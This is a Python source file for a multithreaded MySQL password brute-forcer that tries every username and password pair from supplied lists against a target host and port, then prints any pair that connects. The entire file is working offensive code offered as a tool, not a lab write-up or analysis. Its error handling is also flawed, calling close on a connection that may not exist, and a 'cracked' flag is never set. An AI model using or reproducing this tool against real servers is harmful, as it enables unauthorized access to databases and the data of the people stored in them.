import sys
import mysql.connector
from threading import Thread, activeCount
import time
from colorama import Fore

class Mysql:
    def __init__(self,usernames,passwords,ip,port,thread,database="information_schema"):
        self.usernames = usernames
        self.passwords = passwords
        self.ip = ip
        self.port = port
        self.maxthread = thread
        self.database = database
        self.isdone = False
        self.res = self.start()
        
    def start(self):
        cracked = False
        print(Fore.GREEN + "[+] Brute force started\n")
        for user in self.usernames:
            for pwd in self.passwords:
                if(self.isdone == True):
                    break
                if(cracked):
                    sys.exit()
                if (activeCount() >= self.maxthread):
                    time.sleep(5)

                job = Thread(target=self.cnx, args=(user,pwd))
                job.start()
            if(self.isdone == True):
                break

        print(Fore.LIGHTGREEN_EX + "[+] Finished")

    def cnx(self,username,password):
        try:
            cn = mysql.connector.connect(user=username, password=password, host=self.ip, database=self.database,port=self.port)
            self.isdone = True
            print(Fore.GREEN + f"[+] {username} : {password}")
            cn.close()
        except:
            cn.close()